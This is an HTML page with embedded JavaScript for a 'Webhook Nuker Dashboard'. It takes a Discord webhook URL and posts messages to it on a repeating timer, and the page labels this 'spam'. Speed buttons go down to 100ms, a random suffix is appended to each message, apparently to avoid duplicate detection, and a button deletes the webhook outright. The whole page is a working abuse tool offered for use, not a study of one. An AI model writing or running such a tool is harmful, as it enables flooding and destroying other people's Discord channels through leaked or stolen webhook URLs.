<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>üí£ Webhook Nuker Dashboard</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(145deg, #0f0f0f, #1a1a40);
      color: #ffffff;
      padding: 30px;
      animation: bgmove 20s infinite alternate;
    }

    @keyframes bgmove {
      0% { background-position: 0% 50%; }
      100% { background-position: 100% 50%; }
    }

    h1 {
      text-align: center;
      font-size: 38px;
      margin-bottom: 20px;
      color: #ff00cc;
      text-shadow: 0 0 12px #ff00cc;
    }

    label {
      font-weight: bold;
      display: block;
      margin-top: 12px;
    }

    input, textarea {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border-radius: 6px;
      border: none;
      background-color: #2a2a3d;
      color: #fff;
      font-size: 14px;
    }

    input:focus, textarea:focus {
      outline: none;
      box-shadow: 0 0 8px #00ffff;
    }

    button {
      padding: 10px 16px;
      margin: 10px 8px 0 0;
      font-size: 15px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 8px #00ffff;
      color: white;
    }

    .start { background: #28a745; }
    .stop { background: #dc3545; }
    .fast { background: #007bff; }
    .ultrafast { background: #ffc107; color: black; }
    .delete { background: #6f42c1; }
    .join { background: #5865f2; }

    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 12px #ffffff;
    }

    #console {
      background: #121212;
      color: #00ff88;
      font-family: monospace;
      padding: 10px;
      margin-top: 20px;
      height: 150px;
      overflow-y: auto;
      border-radius: 5px;
      border: 1px solid #444;
    }

    .credits {
      margin-top: 30px;
      text-align: center;
      font-size: 14px;
      color: #999;
    }

    .credits a {
      color: #00ffff;
      text-decoration: none;
    }

    .credits a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h1>üí£ Webhook Nuker Dashboard</h1>

  <label>Webhook URL</label>
  <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">

  <label>Webhook Name</label>
  <input type="text" id="webhookName" placeholder="Webhook Bot Name">

  <label>Avatar URL</label>
  <input type="text" id="avatarUrl" placeholder="Avatar Image URL">

  <label>Message</label>
  <textarea id="message" rows="4" placeholder="Enter message here..."></textarea>

  <div>
    <button class="start" onclick="startSending()">‚ñ∂ Start</button>
    <button class="stop" onclick="stopSending()">‚èπ Stop</button>
    <button class="fast" onclick="setSpeed(300)">‚ö° Fast</button>
    <button class="ultrafast" onclick="setSpeed(100)">üöÄ Ultra Fast</button>
    <button class="delete" onclick="deleteWebhook()">üßπ Delete Webhook</button>
    <button class="join" onclick="joinDiscord()">üí¨ Join My Discord</button>
  </div>

  <div id="console">
    ‚ñ∂ Console ready...
  </div>

  <div class="credits">
    Made by <a href="https://github.com/Mohamedguguu/goodgamedr.github.io" target="_blank">YourGitHub</a> |
    Join us on <a href="https://discord.gg/ncGaCWKns2" target="_blank">Discord</a>
  </div>

  <script>
    let intervalId = null;
    let spamSpeed = 1000;

    function logConsole(message) {
      const consoleBox = document.getElementById('console');
      consoleBox.innerHTML += `\n> ${message}`;
      consoleBox.scrollTop = consoleBox.scrollHeight;
    }

    function getRandomEmoji() {
      const emojis = ['üî•', 'üí£', 'üòà', 'üëæ', 'üöÄ', 'üí•', 'üéØ'];
      return emojis[Math.floor(Math.random() * emojis.length)];
    }

    function getRandomSuffix() {
      return `${getRandomEmoji()} ${Math.floor(10000 + Math.random() * 99999)}`;
    }

    function sendMessage() {
      const url = document.getElementById('webhookUrl').value;
      const name = document.getElementById('webhookName').value;
      const avatar = document.getElementById('avatarUrl').value;
      const base = document.getElementById('message').value;

      if (!url || !base) {
        logConsole("‚ùå Webhook URL or message is missing!");
        return;
      }

      const payload = {
        content: `${base} ${getRandomSuffix()}`,
        username: name || undefined,
        avatar_url: avatar || undefined
      };

      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).then(res => {
        if (res.ok) logConsole("‚úÖ Message sent.");
        else logConsole("‚ö†Ô∏è Failed to send message.");
      }).catch(err => {
        logConsole("‚ùå Error: " + err);
      });
    }

    function startSending() {
      if (intervalId !== null) return;
      logConsole("‚ñ∂ Starting spam...");
      sendMessage();
      intervalId = setInterval(sendMessage, spamSpeed);
    }

    function stopSending() {
      clearInterval(intervalId);
      intervalId = null;
      logConsole("‚èπ Stopped spam.");
    }

    function setSpeed(ms) {
      spamSpeed = ms;
      logConsole(`‚ö° Speed set to ${ms}ms`);
      if (intervalId !== null) {
        stopSending();
        startSending();
      }
    }

    function deleteWebhook() {
      const url = document.getElementById('webhookUrl').value;
      if (!url) return alert("Please enter a webhook URL.");
      const sure = confirm("‚ö†Ô∏è Are you sure you want to delete this webhook?");
      if (sure) {
        fetch(url, { method: 'DELETE' })
          .then(res => {
            if (res.ok) logConsole("üßπ Webhook deleted.");
            else logConsole("‚ùå Failed to delete webhook.");
          }).catch(err => {
            logConsole("‚ùå Error deleting webhook: " + err);
          });
      }
    }

    function joinDiscord() {
      window.open("https://discord.gg/YOUR_INVITE", "_blank");
    }
  </script>
</body>
</html>
